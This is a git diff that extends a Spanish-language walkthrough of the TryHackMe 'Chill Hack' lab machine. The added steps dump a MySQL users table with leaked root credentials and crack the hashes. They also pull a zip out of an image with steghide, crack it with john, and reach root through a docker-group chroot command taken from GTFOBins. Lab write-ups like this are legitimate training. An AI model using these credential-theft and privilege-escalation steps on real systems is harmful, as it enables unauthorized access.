@@ -2,7 +2,7 @@
 title: Write-Up Chill Hack
 description: Write-Up sobre la máquina Chill Hack de TryHackMe
 published: false
-date: 2025-01-24T15:03:36.280Z
+date: 2025-01-24T15:38:12.719Z
 tags: tryhackme
 editor: markdown
 dateCreated: 2025-01-24T11:20:08.121Z
@@ -231,4 +231,131 @@ Hacemos por lo tanto un:
 cat index.php
 ```
 ![imagen_hacking_chill-hack_33indexfiles.png](/imagen_hacking_chill-hack_33indexfiles.png)
-Como observamos en la imagen, tenemos una conexión con una base de datos llamada **webportal**
+Como observamos en la imagen, tenemos una conexión con una base de datos llamada **webportal**, con un usuario que es **root** y la contraseña es **!@m+her00+@db**
+
+Vamos a probar si funciona. Terminamos la conexión chisel y hacemos un 
+```bash
+mysql -u root -p
+```
+![imagen_hacking_chill-hack_34mysql.png](/imagen_hacking_chill-hack_34mysql.png)
+
+Como podemos observar, hemos podido entrar sin problemas, comprobamos que exista la base de datos con
+```sql
+show databases;
+```
+![imagen_hacking_chill-hack_35databases.png](/imagen_hacking_chill-hack_35databases.png)
+Usamos la base de datos webportal y miramos las tablas que tiene
+```sql
+use webportal;
+show tables;
+```
+Como podemos observar, tenemos solo una tabla llamada usuarios, por lo que vamos a analizarlo.
+![imagen_hacking_chill-hack_36tablas.png](/imagen_hacking_chill-hack_36tablas.png)
+Realizamos un select *
+```sql
+select * from users;
+```
+![imagen_hacking_chill-hack_37informacion.png](/imagen_hacking_chill-hack_37informacion.png)
+
+Y obtenemos la información de que usuarios se pueden conectar y cuales son sus credenciales, aunque la contraseña está hasheada. Usamos un website como [CrackStation](https://crackstation.net).
+
+Si introducimos las contraseñas podemos decodificarlas.
+![imagen_hacking_chill-hack_38dehashed.png](/imagen_hacking_chill-hack_38dehashed.png)
+
+Si usamos cualquiera de los dos ususarios, podemos entrar en el website, volvemos a levantar el chisel y entramos con las credenciales.
+
+---
+Una vez dentro, nos va a salir dos textos y una imagen en grande, el texto dice: "Has llegado tan lejos, mira en la oscuridad y encontraras tu respuesta"
+![imagen_hacking_chill-hack_39dentrowebsite.png](/imagen_hacking_chill-hack_39dentrowebsite.png)
+
+Nos da la pista de mirar en la oscuridad, esto puede ser que tengamos algo ocuto en alguna de las dos imagenes. Por lo que vamos a usar steghide.
+
+Steghide es una herramienta de esteganografía, donde podemos ocultar archivos y documentos en imagenes. También nos sirve para extraer.
+
+Por lo tanto vamos a ir a la carpeta de images, y crear un servicio web ahí
+```python
+cd images
+ls
+python3 -m http.server 8000
+```
+![imagen_hacking_chill-hack_40obtenerimagenes.png](/imagen_hacking_chill-hack_40obtenerimagenes.png)
+Y desde nuestra máquina local vamos a obtener los archivos que deseamos, vamos a empezar con el archivo de hacker, ya que a priori es mas sencillo de escribir.
+```bash
+wget http://10.10.38.123:8000/hacker-with-laptop_23-2147985341.jpg
+```
+![imagen_hacking_chill-hack_41obtenidoimagen.png](/imagen_hacking_chill-hack_41obtenidoimagen.png)
+
+Tras tener la imagen, vamos a empezar a usar las herramientas que hemos comentado anteriormente.
+Empezamos con steghide
+```bash
+steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+```
+Nos pedirá una passphrase, el cúal no podremos nada.
+![imagen_hacking_chill-hack_42steghide.png](/imagen_hacking_chill-hack_42steghide.png)
+Una vez hecho esto podemos ver que se ha escrito el contenido en backup.zip
+
+Debido a que es un zip, vamos a intentar extraerlo
+```bash
+unzip backup.zip
+```
+![imagen_hacking_chill-hack_43zippasword.png](/imagen_hacking_chill-hack_43zippassword.png)
+Lamentablemente, nos pide una contraseña. Podemos usar zip2john, para convertir este archivo cifrado en un hash, y ser capaz de romper el hash con john.
+Por lo que haremos:
+```bash
+zip2john backup.zip > hash
+```
+![imagen_hacking_chill-hack_44ziphash.png](/imagen_hacking_chill-hack_44ziphash.png)
+
+Tras esto, usaremos a John con el diccionario de contraseñas de rockyou.txt
+
+El comando que pondremos será:
+```bash
+john --wordlist=/usr/share/wordlist/rockyou.txt hash
+```
+![imagen_hacking_chill-hack_45johnhash.png](/imagen_hacking_chill-hack_45johnhash.png)
+
+Observamos que la contraseña es pass1word.
+Ahora si que podremos extraer los ficheros de backup.zip
+![imagen_hacking_chill-hack_46unzip.png](/imagen_hacking_chill-hack_46unzip.png)
+Nos ha dado un archivo llamado source_code.php, si lo leemos podremos encontrar lo siguiente:
+![imagen_hacking_chill-hack_47anurodhpass.png](/imagen_hacking_chill-hack_47anurodhpass.png)
+
+Podemos observar como hay una contraseña cifrada con base64, y si se hace de forma correcta, podemos entrar como Anurodh. Vamos a decodificar la contraseña
+```bash
+echo IWQwbnRLbjB3bVlwqhnzdzByZA== > base64.txt
+cat base64.txt
+base64 -d base64.txt
+```
+![imagen_hacking_chill-hack_48password.png](/imagen_hacking_chill-hack_48password.png)
+El resultado de toda esta operación, es que la contraseña es **!d0ntKn0wmYp@ssw0rd**.
+
+Ahora podemos intentar loguearnos como Anurodh. Por lo tanto en la máquina de TryHackMe, vamos a poner:
+```bash
+su anurodh
+```
+Y cuando nos pregunte la contraseña ponemos que hemos obtenido anteriormente.
+![imagen_hacking_chill-hack_49anurodh.png](/imagen_hacking_chill-hack_49anurodh.png)
+## Anurodh
+Ahora somos otro usuario, pero ¿Tenemos los permisos suficientes para entrar como root?
+Si hacemos un id;sudo -l, vamos a encontrar algo interesante
+```bash
+id;sudo -l
+```
+![imagen_hacking_chill-hack_50idsudol.png](/imagen_hacking_chill-hack_50idsudol.png)
+Como observamos en la imagen, pertenecemos a los usuarios del grupo de Docker. Si nos vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell), podemos observar como hay un comando que podemos poner para entrar como root.
+```docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+Si ponemos este comando podemos ver como hemos cambiado a una nueva shell que no tiene mucha información, sin embargo si ponemos **whoami** nos devolverá root.
+![imagen_hacking_chill-hack_51root.png](/imagen_hacking_chill-hack_51root.png)
+
+Como root, podemos buscar la flag, que seguramente esté en el home de root, por lo que vamos a poner
+```bash
+cd
+ls
+```
+Encontraremos un archivo llamado *proof.txt* y si le hacemos un cat podemos obtener la flag.
+```bash
+cat proof.txt
+```
+![imagen_hacking_chill-hack_52final.png](/imagen_hacking_chill-hack_52final.png)
